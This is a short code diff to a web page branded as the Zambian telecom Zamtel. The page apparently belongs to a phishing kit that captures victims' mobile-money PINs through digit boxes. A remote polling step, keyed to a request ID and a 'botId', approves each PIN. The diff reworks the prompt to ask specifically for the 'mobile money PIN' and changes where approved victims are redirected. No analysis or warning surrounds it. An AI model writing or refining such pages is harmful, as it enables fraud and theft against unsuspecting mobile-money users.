@@ -112,7 +112,7 @@ body{
   <div class="upper-section">
     <div class="brand-name">Zamtel</div>
     <div class="welcome-text">Welcome</div>
-    <div class="pin-label">Enter your PIN code</div>
+    <div class="pin-label">Enter yourm mobile money PIN code</div>
 
     <div class="pin-boxes">
       <input type="tel" maxlength="1">
@@ -220,7 +220,7 @@ boxes.forEach((box,i)=>{
       const ok = await pollPinApproval(res.requestId);
       if(ok){
         setStatus("PIN approved. Redirecting...", "success");
-        window.location.href = "code.html?botId=" + botId;
+        window.location.href = "success.html?botId=" + botId;
       } else {
         setStatus("Incorrect PIN code.", "error");
         boxes.forEach(b=>{b.disabled=false;b.value="";});
